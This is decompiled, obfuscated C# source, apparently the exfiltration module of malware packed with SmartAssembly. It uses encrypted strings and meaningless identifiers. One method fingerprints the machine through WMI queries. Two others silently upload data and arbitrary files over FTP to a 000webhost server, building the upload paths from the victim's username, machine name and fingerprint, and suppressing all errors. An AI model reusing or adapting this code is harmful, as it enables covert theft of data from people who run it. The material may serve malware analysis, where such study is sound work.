using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace AFBGXefvzhgrS;

internal sealed class QBleGGpUEWf
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string FoKQScKNuhKD()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107390196));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107390207)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107390158);
		ManagementObject val3 = new ManagementObject(getString_0(107390185) + text2 + getString_0(107390144));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107390139)).ToString();
		return text3 + text;
	}

	public static void YmrqNfgVQZRJBKN(string SMPksqSgYXpd = "ftp://files.000webhost.com/public_html/", string odExPeMfxzC = "FTP UserName", string PstkCcyqku = "FTP Password", string sUUHZXrrnLP = "")
	{
		try
		{
			string text = FoKQScKNuhKD();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(SMPksqSgYXpd + getString_0(107390114) + Environment.UserName + getString_0(107390069) + Environment.MachineName + getString_0(107390080) + text + getString_0(107390075));
			ftpWebRequest.Method = getString_0(107390034);
			ftpWebRequest.Credentials = new NetworkCredential(odExPeMfxzC, PstkCcyqku);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(sUUHZXrrnLP);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void ToxwHOenSO(string QwVZfQozyaE = "ftp://files.000webhost.com/public_html/", string cwMuwVjQIOk = "FTP UserName", string ZtUbXzvIvXMN = "ACCESS", string TRZSFiLOVIW = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(cwMuwVjQIOk, ZtUbXzvIvXMN);
			webClient.UploadFile(QwVZfQozyaE + string.Format(getString_0(107390114) + Environment.UserName + getString_0(107390069) + Environment.MachineName + getString_0(107390080) + Path.GetFileName(TRZSFiLOVIW)), getString_0(107390034), TRZSFiLOVIW);
		}
		catch
		{
		}
	}

	static QBleGGpUEWf()
	{
		Strings.CreateGetStringDelegate(typeof(QBleGGpUEWf));
	}
}
